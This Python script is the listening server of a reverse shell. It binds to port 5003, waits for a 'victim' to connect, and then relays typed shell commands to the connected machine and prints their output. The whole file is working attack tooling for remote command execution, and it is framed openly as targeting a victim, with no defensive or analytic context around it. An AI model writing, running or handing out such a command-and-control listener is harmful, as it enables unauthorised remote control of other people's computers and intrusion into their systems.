import socket
import time
SERVER_HOST = "0.0.0.0"
time.sleep(2)
print("server connected...")
SERVER_PORT = 5003
time.sleep(1)
print("assigning port")
# send 1024 (1kb) a time (as buffer size)
BUFFER_SIZE = 1024
# create a socket object
s = socket.socket()
# bind the socket to all IP addresses of this host

s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print("waiting for the victim to connect")

print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
time.sleep(3)
# accept any connections attempted
client_socket, client_address = s.accept()
print(f"[+] {client_address[0]}:{client_address[1]} Connected!")
# just sending a message, for demonstration purposes
msg = input("enter the msg: " )
message = f"{msg}".encode()
client_socket.send(message)
wd = client_socket.recv(BUFFER_SIZE).decode()
while True:
    # get the command from prompt
    command = input(f"{wd}>>> ")
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    results = client_socket.recv(BUFFER_SIZE).decode()
    # print them
    print(results)
# close connection to the client
client_socket.close()
# close server connection
s.close()